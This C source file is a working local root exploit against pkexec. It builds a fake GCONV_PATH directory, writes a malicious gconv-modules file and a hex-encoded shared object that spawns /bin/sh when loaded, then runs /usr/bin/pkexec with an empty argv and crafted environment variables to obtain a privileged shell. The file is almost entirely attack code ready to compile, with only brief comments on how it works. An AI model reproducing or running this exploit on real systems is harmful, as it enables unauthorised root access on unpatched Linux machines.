#include <sys/stat.h>
#include <stddef.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>

// https://saarsec.rocks/2020/05/14/golf.so.html
const char evil_so[] = "\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x3e\x00\x01\x00\x00\x00\x0f\x05\x01\x00\x00\x00\x0f\x05\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x31\xc0\xeb\x20\x38\x00\x02\x00\xa3\x00\x00\x00\x00\x00\x00\x00\xa3\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\xb0\x3b\xeb\xbe\x2f\x62\x69\x6e\x2f\x73\x68\x00\x82\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x3d\xe9\xff\xff\xff\x6a\x00\x57\x48\x89\xe6\xeb\xb9\x40\x30\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x6a\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00\x06";
const char evil_mod[] = "module INTERNAL evil// evil\n";
char *envp[] = {
        "evildir",
        "PATH=GCONV_PATH=.",
        "CHARSET=evil",
        "SHELL=evil",
        NULL
    };

int main() {
    int fd;
    char* dir = mkdtemp("pkexec");
    chdir(dir);
    // Create a fake executable
    mkdir("GCONV_PATH=.", 0755);
    fd = open("GCONV_PATH=./evildir", O_WRONLY|O_CREAT, 0755);
    close(fd);
    // Executing 'evildir' with PATH set to our 'GCONV_PATH=.' dir will map to
    // GCONV_PATH=./evildir, which will be written into argv[1] (really envp[0])
    mkdir("evildir", 0755);
    // Setup a malicious gconv-modules which uses GCONV_PATH/evil.so to convert to
    // charset 'evil'
    fd = open("evildir/gconv-modules", O_WRONLY|O_CREAT, 0755);
    write(fd, evil_mod, sizeof(evil_mod));
    close(fd);
    // Create a shared object that pops a shell upon load
    fd = open("evil.so", O_WRONLY|O_CREAT, 0755);
    write(fd, evil_so, sizeof(evil_so));
    close(fd);
    char* argv[] = {NULL};
    execve("/usr/bin/pkexec", argv, envp);
}
